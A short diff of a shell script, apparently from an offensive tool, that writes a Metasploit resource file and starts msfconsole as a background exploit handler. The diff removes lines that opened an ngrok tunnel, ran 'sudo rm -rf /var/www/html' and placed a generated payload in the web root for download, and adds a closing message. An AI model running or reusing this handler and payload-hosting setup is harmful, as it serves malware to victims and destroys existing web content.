@@ -35,8 +35,5 @@ touch RC/hack.rc
             echo exploit -j -z >> RC/hack.rc
             cat RC/hack.rc
             gnome-terminal -- msfconsole -r RC/hack.rc
-gnome-terminal -- ./ngrok http 8080
-sudo rm -rf /var/www/html
-sudo mkdir /var/www/html
-sudo cd payload
-sudo mv $pname -t /var/www/html
+echo "thanks for using me"
+
